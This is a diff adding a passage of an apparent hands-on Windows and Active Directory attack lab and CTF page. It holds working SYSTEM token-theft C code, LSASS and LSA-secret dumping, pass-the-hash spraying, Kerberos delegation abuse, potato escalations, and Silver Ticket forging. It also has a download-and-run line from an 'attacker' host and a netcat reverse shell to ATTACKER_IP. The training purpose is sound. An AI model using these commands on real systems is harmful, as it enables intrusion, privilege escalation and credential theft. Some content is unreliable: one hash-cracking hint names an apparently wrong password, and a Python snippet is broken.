+# - Flags: forwardable, renewable, pre_authent
+# - Key Type (encryption used)
+# - PAC details (if decodable)
+
+# Step 5: Export tickets to file:
+Rubeus.exe dump /nowrap > tickets.txt
+# Convert for Impacket:
+Rubeus.exe dump /luid:0x12345 /service:krbtgt /nowrap
+# Use ticketConverter.py to convert base64 → .ccache
+
+# Step 6: Monitor new ticket requests in real-time:
+Rubeus.exe harvest /interval:30
+# Every 30 seconds, displays new tickets
+
+# Step 7: Examine with klist:
+klist tickets
+# Note the difference between TGT (krbtgt/REALM) and service tickets (cifs/host, HTTP/host, etc.)
+
+# Step 8: Purge and re-request:
+klist purge
+# Access a network share:
+dir \\fileserver\share
+# Check tickets again:
+klist
+# New TGT + service ticket appeared (Kerberos transparent SSO in action)</code></pre>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 7: Token Manipulation with C (CreateProcessWithToken)</h4>
+            <span class="difficulty difficulty-hard">Hard</span>
+            <p class="objective">Objective: Write and execute C code that steals a SYSTEM token from another process and spawns a new process with elevated privileges.</p>
+            <div class="setup-code">
+<pre><code class="language-c">// token_theft.c - Compile with: cl.exe token_theft.c advapi32.lib
+// Must run as Administrator (needs SeDebugPrivilege)
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;tlhelp32.h&gt;
+
+DWORD FindProcessId(const wchar_t* processName) {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32W pe;
+    pe.dwSize = sizeof(pe);
+    
+    if (Process32FirstW(hSnap, &amp;pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, processName) == 0) {
+                CloseHandle(hSnap);
+                return pe.th32ProcessID;
+            }
+        } while (Process32NextW(hSnap, &amp;pe));
+    }
+    CloseHandle(hSnap);
+    return 0;
+}
+
+int main() {
+    // Step 1: Enable SeDebugPrivilege
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tp;
+    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);
+    LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
+    CloseHandle(hToken);
+    printf("[+] SeDebugPrivilege enabled\n");
+
+    // Step 2: Find winlogon.exe (runs as SYSTEM)
+    DWORD pid = FindProcessId(L"winlogon.exe");
+    if (!pid) { printf("[-] winlogon.exe not found\n"); return 1; }
+    printf("[+] winlogon.exe PID: %lu\n", pid);
+
+    // Step 3: Open process and its token
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    if (!hProcess) { printf("[-] OpenProcess failed: %lu\n", GetLastError()); return 1; }
+
+    HANDLE hProcessToken;
+    OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &amp;hProcessToken);
+    printf("[+] Got process token handle\n");
+
+    // Step 4: Duplicate as primary token
+    HANDLE hDupToken;
+    DuplicateTokenEx(hProcessToken, MAXIMUM_ALLOWED, NULL, 
+                     SecurityImpersonation, TokenPrimary, &amp;hDupToken);
+    printf("[+] Duplicated token\n");
+
+    // Step 5: Create new process with stolen SYSTEM token
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    si.lpDesktop = L"winsta0\\default";
+    
+    if (CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, 
+            L"C:\\Windows\\System32\\cmd.exe", NULL, 
+            CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi)) {
+        printf("[+] SYSTEM cmd.exe spawned! PID: %lu\n", pi.dwProcessId);
+    } else {
+        printf("[-] CreateProcessWithTokenW failed: %lu\n", GetLastError());
+    }
+
+    // Cleanup
+    CloseHandle(hDupToken);
+    CloseHandle(hProcessToken);
+    CloseHandle(hProcess);
+    return 0;
+}</code></pre>
+<pre><code class="language-powershell"># Compile and run:
+cl.exe token_theft.c advapi32.lib
+.\token_theft.exe
+# A new cmd.exe should appear running as NT AUTHORITY\SYSTEM
+
+# Verify in the new cmd:
+whoami
+# Output: nt authority\system</code></pre>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 8: ACL Enumeration with PowerView</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">Objective: Enumerate and identify dangerous ACL configurations in Active Directory that could lead to privilege escalation.</p>
+            <div class="setup-code">
+<pre><code class="language-powershell"># Import PowerView (from PowerSploit):
+Import-Module .\PowerView.ps1
+# Or: IEX(New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
+
+# Step 1: Find objects where you have interesting permissions:
+Find-InterestingDomainAcl -ResolveGUIDs | 
+  Where-Object { $_.IdentityReferenceName -eq $env:USERNAME } |
+  Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType
+
+# Step 2: Check ACLs on Domain Admins group:
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | 
+  Where-Object { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty" } |
+  Select-Object @{N='Principal';E={(Convert-SidToName $_.SecurityIdentifier)}}, ActiveDirectoryRights
+
+# Step 3: Check ACLs on specific user (for ForceChangePassword):
+Get-DomainObjectAcl -Identity "targetuser" -ResolveGUIDs |
+  Where-Object { $_.ObjectAceType -eq "User-Force-Change-Password" } |
+  Select-Object @{N='Principal';E={(Convert-SidToName $_.SecurityIdentifier)}}
+
+# Step 4: Find WriteDACL permissions (can give yourself any rights):
+Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs |
+  Where-Object { $_.ActiveDirectoryRights -match "WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-.*-1[0-9]{3,}" } |
+  Select-Object ObjectDN, @{N='Principal';E={(Convert-SidToName $_.SecurityIdentifier)}}
+
+# Step 5: Check DCSync permissions:
+Get-DomainObjectAcl "DC=corp,DC=local" -ResolveGUIDs |
+  Where-Object { $_.ObjectAceType -match "DS-Replication-Get-Changes" } |
+  Select-Object @{N='Principal';E={(Convert-SidToName $_.SecurityIdentifier)}}, ObjectAceType
+
+# Step 6: Enumerate computer object ACLs (for RBCD attack):
+Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs |
+  Where-Object { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty" -and 
+                 $_.SecurityIdentifier -match "S-1-5-21-.*-1[0-9]{3,}" } |
+  Select-Object ObjectDN, @{N='Principal';E={(Convert-SidToName $_.SecurityIdentifier)}}, ActiveDirectoryRights
+
+# Step 7: Exploit - WriteDACL on domain object → grant DCSync:
+Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity youruser -Rights DCSync -Verbose
+# Then: secretsdump.py corp.local/youruser:pass@DC01</code></pre>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 9: Impersonation Token Exploitation</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">Objective: Exploit impersonation tokens on a Windows service to escalate privileges. Simulate what happens when a service impersonates a client.</p>
+            <div class="setup-code">
+<pre><code class="language-powershell"># Concept: Named pipe impersonation
+# A service creates a named pipe → admin connects → service impersonates the admin token
+
+# Step 1: Check current privileges for impersonation capability:
+whoami /priv
+# Look for: SeImpersonatePrivilege (enabled for service accounts, IIS AppPool, etc.)
+
+# Step 2: List available impersonation tokens (with Incognito or PowerShell):
+# Using meterpreter:
+# meterpreter> load incognito
+# meterpreter> list_tokens -u
+# Delegation Tokens Available:
+#   NT AUTHORITY\SYSTEM
+#   CORP\admin
+
+# Step 3: Named pipe impersonation server (C code concept):
+# See token_theft.c pattern, but using:
+# CreateNamedPipe() → ConnectNamedPipe() → ImpersonateNamedPipeClient()
+# Then: OpenThreadToken() → DuplicateTokenEx() → CreateProcessWithTokenW()
+
+# Step 4: Practical exploitation with PrintSpoofer/GodPotato:
+# From a service account with SeImpersonatePrivilege:
+
+# PrintSpoofer (abuses print spooler pipe):
+PrintSpoofer.exe -i -c cmd
+# Spawns SYSTEM shell by creating a pipe, triggering SYSTEM to connect
+
+# GodPotato (works on newer Windows):
+GodPotato.exe -cmd "cmd /c whoami > C:\proof.txt"
+
+# JuicyPotatoNG:
+JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami > C:\proof.txt"
+
+# Step 5: Understanding the flow:
+# 1. Attacker has SeImpersonatePrivilege (e.g., IIS/SQL service account)
+# 2. Trick a SYSTEM process into connecting to attacker's named pipe
+# 3. Call ImpersonateNamedPipeClient() → get SYSTEM impersonation token
+# 4. DuplicateTokenEx() → CreateProcessWithTokenW() → SYSTEM process
+
+# Step 6: Verify:
+whoami
+# nt authority\system</code></pre>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 10: LSASS Credential Extraction</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">Objective: Extract credentials from LSASS memory using multiple methods — understand what each technique retrieves and when to use it.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># Method 1: mimikatz (direct - requires admin + SeDebugPrivilege):
+privilege::debug
+sekurlsa::logonpasswords
+
+# Observe output columns:
+# - Authentication Id (LUID)
+# - Session / User Name / Domain / Logon Server / Logon Time
+# - msv: NT hash, LM hash (if exists)
+# - tspkg: plaintext (if CredSSP/RDP)
+# - wdigest: plaintext (if UseLogonCredential=1)
+# - kerberos: plaintext password or "n.a." (modern systems)
+# - ssp / credman: additional stored credentials
+
+# Method 2: MiniDump + offline parsing (OPSEC - avoids running mimikatz on target):
+# Create minidump:
+# Task Manager → Details → lsass.exe → Create dump file
+# or:
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
+
+# Transfer dump to attacker machine, parse offline:
+pypykatz lsa minidump lsass.dmp
+# or:
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+
+# Method 3: nanodump (evasive - unhooks + direct syscalls):
+nanodump.exe --write C:\temp\nano.dmp
+# Smaller dump, focused on credentials
+
+# Method 4: Remote credential extraction (no tool on disk):
+# CrackMapExec with lsassy module:
+nxc smb TARGET -u admin -H HASH -M lsassy
+
+# Impacket secretsdump (DCSync - doesn't touch LSASS):
+secretsdump.py corp.local/admin:pass@DC01
+
+# Method 5: Registry-based (SAM + LSA secrets, no LSASS needed):
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive  
+reg save HKLM\SECURITY security.hive
+secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
+
+# What you get from each location:
+# LSASS: Live NT hashes, Kerberos TGTs, plaintext (wdigest), DPAPI keys
+# SAM: Local account NT hashes only
+# SECURITY (LSA secrets): Machine account password, service passwords, cached creds
+# NTDS.dit: All domain account hashes (on DC only)</code></pre>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 11: Pass-the-Hash with CrackMapExec</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">Objective: Use captured NT hashes to authenticate across the network without cracking the password. Verify lateral movement capability.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># Scenario: You've dumped the local admin hash from one machine.
+# The same local admin password is reused across multiple machines (common).
+# Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+
+# Step 1: Verify the hash works on target:
+nxc smb 192.168.1.100 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
+# Look for: [+] ... (Pwn3d!)  ← means local admin access
+
+# Step 2: Spray the hash across subnet:
+nxc smb 192.168.1.0/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
+# Identifies all machines where this hash works
+
+# Step 3: Execute commands:
+nxc smb 192.168.1.100 -u administrator -H HASH -x "whoami &amp;&amp; hostname"
+# Uses smbexec by default (Type 3 logon - no cred caching!)
+
+# Step 4: Dump SAM on remote machines (credential harvesting):
+nxc smb 192.168.1.100 -u administrator -H HASH --sam
+# Collect more hashes → pivot further
+
+# Step 5: Dump LSA secrets (may contain domain service account passwords):
+nxc smb 192.168.1.100 -u administrator -H HASH --lsa
+
+# Step 6: Use with different execution methods:
+# Impacket wmiexec (uses WMI - stealthier):
+wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.100
+
+# Impacket psexec (creates service - noisier but reliable):
+psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.100
+
+# Evil-WinRM (WinRM/5985):
+evil-winrm -i 192.168.1.100 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
+
+# Step 7: PtH with mimikatz (spawn process with different creds on Windows):
+sekurlsa::pth /user:administrator /domain:. /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe
+# New cmd.exe: any network access uses the injected hash (logon type 9)
+
+# Key insight: PtH works because NTLM challenge-response uses NT hash as the key.
+# The server never sees the password — only the hash-derived response.</code></pre>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 12: Kerberos Delegation Exploitation (S4U)</h4>
+            <span class="difficulty difficulty-hard">Hard</span>
+            <p class="objective">Objective: Exploit constrained delegation to impersonate any user (including Domain Admin) to a target service using the S4U2Self and S4U2Proxy extensions.</p>
+            <div class="setup-code">
+<pre><code class="language-powershell"># Scenario: You've compromised svc_web (has constrained delegation to cifs/fileserver)
+# msDS-AllowedToDelegateTo: cifs/fileserver.corp.local
+
+# Step 1: Identify delegation configurations:
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select Name
+Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo | Select Name, msDS-AllowedToDelegateTo
+Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null}
+
+# Step 2: Constrained Delegation Attack with Rubeus:
+# Get TGT for compromised service account:
+Rubeus.exe asktgt /user:svc_web /rc4:E3A0168BC21CFB88B95C954A5B18F57C /domain:corp.local /outfile:svc_tgt.kirbi
+
+# Step 3: S4U chain — impersonate Domain Admin to allowed service:
+Rubeus.exe s4u /ticket:svc_tgt.kirbi /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /ptt
+
+# Step 4: Verify access:
+dir \\fileserver.corp.local\C$
+# Should have admin access as administrator!</code></pre>
+<pre><code class="language-bash"># Step 5: Alternative service name abuse:
+# The SPN in msDS-AllowedToDelegateTo is just a filter — the ticket is valid for any
+# service on that HOST (same key). Use /altservice:
+Rubeus.exe s4u /ticket:svc_tgt.kirbi /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /altservice:HOST,HTTP,WSMAN,RPCSS /ptt
+# Now you have tickets for WinRM, DCOM, etc. on fileserver!
+
+# Step 6: With Impacket:
+getST.py -spn cifs/fileserver.corp.local -impersonate administrator corp.local/svc_web -hashes :E3A0168BC21CFB88B95C954A5B18F57C
+export KRB5CCNAME=administrator.ccache
+psexec.py -k -no-pass fileserver.corp.local
+
+# Step 7: RBCD attack (if you can write msDS-AllowedToActOnBehalfOfOtherIdentity):
+# Create machine account:
+addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss123!' corp.local/youruser:pass
+
+# Set RBCD:
+rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write corp.local/youruser:pass
+
+# Get ticket:
+getST.py -spn cifs/target.corp.local -impersonate administrator corp.local/'EVIL$':'P@ss123!'
+export KRB5CCNAME=administrator.ccache
+psexec.py -k -no-pass target.corp.local</code></pre>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 13: LSA Secrets Extraction</h4>
+            <span class="difficulty difficulty-hard">Hard</span>
+            <p class="objective">Objective: Extract LSA secrets from a compromised machine to recover service account passwords, machine account credentials, and cached domain logons.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># LSA secrets are stored in: HKLM\SECURITY\Policy\Secrets (encrypted with boot key from SYSTEM hive)
+
+# Method 1: mimikatz (local, requires SYSTEM):
+privilege::debug
+token::elevate
+lsadump::secrets
+
+# Output includes:
+# $MACHINE.ACC - Machine account password (base64/hex)
+#   → Use for Silver Ticket or RBCD attacks
+# _SC_ServiceName - Service account passwords (plaintext!)
+#   → Services running as domain accounts store password here
+# DefaultPassword - Auto-logon password (if configured)
+# NL$KM - Key Material for cached credentials
+# DPAPI_SYSTEM - DPAPI system backup key
+
+# Method 2: Registry save + offline (if you have admin but can't run mimikatz):
+reg save HKLM\SYSTEM C:\temp\system.hive
+reg save HKLM\SECURITY C:\temp\security.hive
+
+# Transfer to attacker machine:
+secretsdump.py -system system.hive -security security.hive LOCAL
+
+# Method 3: Remote with Impacket:
+secretsdump.py corp.local/admin:pass@192.168.1.100
+# Shows SAM + LSA Secrets + Cached Domain Credentials (DCC2)
+
+# Method 4: CrackMapExec:
+nxc smb 192.168.1.100 -u admin -H HASH --lsa
+
+# Step 5: Crack cached domain credentials (DCC2/mscash2):
+# Format from secretsdump: username:hash (mscash2)
+hashcat -m 2100 cached_creds.txt wordlist.txt
+# Mode 2100 = Domain Cached Credentials 2 (DCC2)
+# VERY slow to crack (~50k/s on RTX 4090)
+
+# Step 6: Use machine account password:
+# Convert machine account password from hex to NTLM:
+# The $MACHINE.ACC hex value IS the plaintext password
+# Calculate NT hash: python -c "import hashlib; print(hashlib.new('md4',b'PASSWORD'.encode('utf-16-le')).hexdigest())"
+
+# Use machine account for Silver Ticket:
+ticketer.py -nthash MACHINE_HASH -domain-sid S-1-5-21-... -domain corp.local -spn cifs/target.corp.local administrator
+
+# Step 7: Extracting service account passwords:
+# _SC_SQLService → "MyS3cretP@ss!"
+# Now authenticate as that service account to access other systems</code></pre>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 14: Token Privilege Escalation (SeImpersonate → SYSTEM)</h4>
+            <span class="difficulty difficulty-hard">Hard</span>
+            <p class="objective">Objective: Escalate from a service account with SeImpersonatePrivilege to NT AUTHORITY\SYSTEM using various potato exploits and understand the underlying mechanism.</p>
+            <div class="setup-code">
+<pre><code class="language-powershell"># Scenario: You have a shell as IIS AppPool or SQL Server service account
+# These accounts have SeImpersonatePrivilege by default
+
+# Step 1: Verify privileges:
+whoami /priv
+# SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
+# SeAssignPrimaryTokenPrivilege  Replace a process level token            Enabled
+
+# Step 2: Understand the potato family:
+# All potato exploits follow the same pattern:
+# 1. Create a COM server / named pipe that SYSTEM will connect to
+# 2. Trick a SYSTEM-level process into authenticating to it
+# 3. Capture the SYSTEM token via ImpersonateNamedPipeClient/SecurityImpersonation
+# 4. Use DuplicateTokenEx + CreateProcessWithToken to spawn SYSTEM process
+
+# Step 3: PrintSpoofer (abuses SpoolSS named pipe):
+# Works: Windows Server 2016/2019, Windows 10
+PrintSpoofer64.exe -i -c "cmd /c whoami"
+# Output: nt authority\system
+
+# Interactive shell:
+PrintSpoofer64.exe -i -c powershell.exe
+
+# Step 4: GodPotato (uses DCOM/RPCSS - works on latest Windows):
+GodPotato-NET4.exe -cmd "cmd /c whoami > C:\temp\proof.txt"
+GodPotato-NET4.exe -cmd "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
+
+# Step 5: JuicyPotatoNG (DCOM abuse - many CLSIDs):
+JuicyPotatoNG.exe -t * -p "cmd.exe" -a "/c whoami > C:\temp\proof.txt"
+
+# Step 6: SweetPotato (combined techniques):
+SweetPotato.exe -p cmd.exe -a "/c whoami"
+
+# Step 7: EfsPotato (MS-EFSR coercion):
+EfsPotato.exe "whoami"
+
+# Step 8: Manual exploitation concept (advanced):
+# The fundamental trick:</code></pre>
+<pre><code class="language-c">// 1. Create named pipe: \\.\pipe\evil
+// 2. Trigger SYSTEM process to connect (e.g., SpoolSS RPC call)
+// 3. In pipe handler:
+ImpersonateNamedPipeClient(hPipe);  // Now thread runs as SYSTEM
+OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;hToken);
+DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &amp;hNewToken);
+CreateProcessWithTokenW(hNewToken, 0, L"cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);
+// cmd.exe now runs as SYSTEM</code></pre>
+<pre><code class="language-powershell"># Step 9: Without potatoes - if you can write a service:
+sc.exe create evilsvc binPath="cmd /c whoami > C:\temp\proof.txt" start=demand
+sc.exe start evilsvc
+# Service runs as SYSTEM by default
+
+# Step 10: Detection:
+# - Event 4688 (Process Creation) with unusual parent→child relationship
+# - Sysmon Event 1: cmd.exe spawned by w3wp.exe or sqlservr.exe as SYSTEM
+# - Named pipe creation events (Sysmon Event 17/18)</code></pre>
+            </div>
+          </div>
+
+        </div>
+
+        <!-- ==================== CTF TAB ==================== -->
+        <div class="tab-pane fade" id="ctf" role="tabpanel">
+          <h2>CTF Challenges</h2>
+
+          <div class="ctf-card">
+            <h4>Challenge 1: Identify the SID</h4>
+            <span class="difficulty difficulty-easy">Easy</span>
+            <p class="objective">You intercepted the following SID from a network capture: <code>S-1-5-21-3623811015-3361044348-30300820-512</code>. What group does this represent? Additionally, what SID represents the built-in SYSTEM account?</p>
+            <div class="setup-code">
+<pre><code class="language-powershell"># Given: S-1-5-21-3623811015-3361044348-30300820-512
+# 
+# Tasks:
+# 1. Identify what RID 512 represents
+# 2. Provide the SID for NT AUTHORITY\SYSTEM
+# 3. What RID would the built-in Administrator account have?
+# 4. If a new user is the first created in this domain, what would their RID likely be?
+</code></pre>
+            </div>
+            <button class="hint-toggle" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display==='block'?'none':'block'">Show Hint</button>
+            <div class="hint-content" style="display:none">
+              <p><strong>Hint:</strong> RID 512 = Domain Admins. SYSTEM = S-1-5-18 (not domain-relative). Built-in Administrator = RID 500. First user-created account typically starts at RID 1000 or 1103 (after default groups).</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 2: Crack the NTLM Hash</h4>
+            <span class="difficulty difficulty-easy">Easy</span>
+            <p class="objective">You dumped the SAM database and found: <code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::</code>. Identify the hash type, determine if LM is stored, and crack the NT hash.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># Hash: e19ccf75ee54e06b06a5907af13cef42
+#
+# Tasks:
+# 1. What does "aad3b435b51404eeaad3b435b51404ee" mean for the LM portion?
+# 2. What hashcat mode would you use to crack the NT hash?
+# 3. Crack it (hint: it's a common password)
+#
+# hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
+</code></pre>
+            </div>
+            <button class="hint-toggle" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display==='block'?'none':'block'">Show Hint</button>
+            <div class="hint-content" style="display:none">
+              <p><strong>Hint:</strong> "aad3b435b51404eeaad3b435b51404ee" is the LM hash of an empty/disabled password (LM is disabled). Mode 1000 is for NT hashes (MD4). The hash <code>e19ccf75ee54e06b06a5907af13cef42</code> corresponds to "thePassword" — try rockyou.txt. Use CrackStation online if you don't want to run hashcat.</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 3: Identify Logon Type from Event Log</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">Analyze the following Security Event Log entry and determine: the logon type, whether credentials are cached in LSASS, and the attack implications.</p>
+            <div class="setup-code">
+<pre><code class="language-powershell"># Event ID: 4624 (Successful Logon)
+# Subject:
+#   Security ID: S-1-0-0
+#   Account Name: -
+# Logon Information:
+#   Logon Type: 10
+#   Restricted Admin Mode: No
+# New Logon:
+#   Security ID: S-1-5-21-3623811015-3361044348-30300820-1109
+#   Account Name: svc_backup
+#   Account Domain: CORP
+#   Logon ID: 0x1A2B3C
+# Network Information:
+#   Workstation Name: WKS01
+#   Source Network Address: 192.168.1.50
+#   Source Port: 49832
+# Detailed Authentication:
+#   Logon Process: User32
+#   Authentication Package: Negotiate
+#   Package Name (NTLM only): -
+#
+# Questions:
+# 1. What type of logon is this? (Name it)
+# 2. Are credentials cached in LSASS on this machine?
+# 3. If an attacker dumps LSASS memory here, what will they find?
+# 4. What tool was likely used to generate this logon?
+# 5. How would using Restricted Admin Mode change the caching behavior?
+</code></pre>
+            </div>
+            <button class="hint-toggle" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display==='block'?'none':'block'">Show Hint</button>
+            <div class="hint-content" style="display:none">
+              <p><strong>Hint:</strong> Type 10 = RemoteInteractive (RDP). Credentials ARE cached in LSASS (same as Type 2). Attacker would find NT hash + Kerberos tickets for svc_backup. Restricted Admin Mode would use network logon (Type 3 behavior) so credentials wouldn't be cached — but the RDP user needs local admin on the target.</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 4: Exploit Weak DACL</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">You discovered that your user (lowpriv) has WriteDACL permission on the Domain Admins group. Describe the full attack chain to escalate to Domain Admin.</p>
+            <div class="setup-code">
+<pre><code class="language-powershell"># Enumeration output:
+# ObjectDN: CN=Domain Admins,CN=Users,DC=corp,DC=local
+# ActiveDirectoryRights: WriteDacl
+# SecurityIdentifier: S-1-5-21-...-1109 (lowpriv)
+#
+# Tasks:
+# 1. What does WriteDACL allow you to do?
+# 2. Write the PowerView commands to exploit this
+# 3. What would you add to the DACL?
+# 4. How would you then escalate?
+# 5. What event IDs would this generate for defenders?
+</code></pre>
+            </div>
+            <button class="hint-toggle" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display==='block'?'none':'block'">Show Hint</button>
+            <div class="hint-content" style="display:none">
+              <p><strong>Hint:</strong> WriteDACL lets you modify the access control list. Steps: 1) Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity lowpriv -Rights All 2) Now you have GenericAll on Domain Admins 3) Add-DomainGroupMember -Identity "Domain Admins" -Members lowpriv 4) You're now a Domain Admin. Event IDs: 4662 (directory service access), 5136 (directory service object modification).</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 5: NTLM Relay for Credential Access</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">You're on a network where SMB signing is disabled on workstations. A Domain Admin regularly accesses a file share. Design an NTLM relay attack to obtain the admin's NT hash from the Domain Controller.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+# - DC01 (192.168.1.1) - SMB signing REQUIRED (default for DCs)
+# - WKS01 (192.168.1.50) - Admin's workstation
+# - SRV01 (192.168.1.100) - File server, SMB signing NOT required
+# - Attacker (192.168.1.200)
+#
+# Constraints:
+# - Cannot relay to DC (signing required)
+# - Admin has local admin rights on SRV01
+# - Goal: Get the Domain Admin's NT hash
+#
+# Questions:
+# 1. What is your relay target and why?
+# 2. How will you trigger the admin's authentication?
+# 3. What ntlmrelayx options will you use?
+# 4. Once you relay to SRV01, what do you dump?
+# 5. Why can't you relay directly to DC01?
+</code></pre>
+            </div>
+            <button class="hint-toggle" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display==='block'?'none':'block'">Show Hint</button>
+            <div class="hint-content" style="display:none">
+              <p><strong>Hint:</strong> Relay to SRV01 (no SMB signing). Trigger: Responder LLMNR poisoning or WebDAV to capture admin's auth when they access a non-existent share. Use <code>ntlmrelayx.py -t smb://192.168.1.100 -smb2support</code> → it auto-dumps SAM. But for the admin's NT hash from LSASS, use <code>-c "cmd /c rundll32 comsvcs.dll MiniDump PID dump full"</code> or use <code>-socks</code> for interactive access. Can't relay to DC because SMB signing is required → attacker can't sign packets without session key.</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 6: Forge a Silver Ticket</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">You've compromised the SQL Server service account (svc_sql) and obtained its NT hash. Forge a Silver Ticket to access the SQL Server as a Domain Admin without touching the DC.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># Given:
+# - Service account: svc_sql
+# - SPN: MSSQLSvc/sql01.corp.local:1433
+# - NT Hash: 58a478135a93ac3bf058a5ea0e8fdb71
+# - Domain: corp.local
+# - Domain SID: S-1-5-21-3623811015-3361044348-30300820
+# - Target user to impersonate: administrator (RID 500)
+#
+# Tasks:
+# 1. Write the mimikatz command to forge the Silver Ticket
+# 2. Write the equivalent Rubeus command
+# 3. Why doesn't the DC see this authentication?
+# 4. What is the limitation of a Silver Ticket vs Golden Ticket?
+# 5. How can defenders detect Silver Ticket usage?
+</code></pre>
+            </div>
+            <button class="hint-toggle" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display==='block'?'none':'block'">Show Hint</button>
+            <div class="hint-content" style="display:none">
+              <p><strong>Hint:</strong> <code>kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-3623811015-3361044348-30300820 /target:sql01.corp.local /service:MSSQLSvc /rc4:58a478135a93ac3bf058a5ea0e8fdb71 /id:500 /ptt</code>. The DC doesn't see it because AP-REQ goes directly to the service — no TGS-REQ needed. Limitation: only valid for the single service (SPN) whose key was used. Detection: Event 4769 missing on DC for a service access, PAC validation failures (if service validates PAC with DC).</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 7: Token Impersonation Chain</h4>
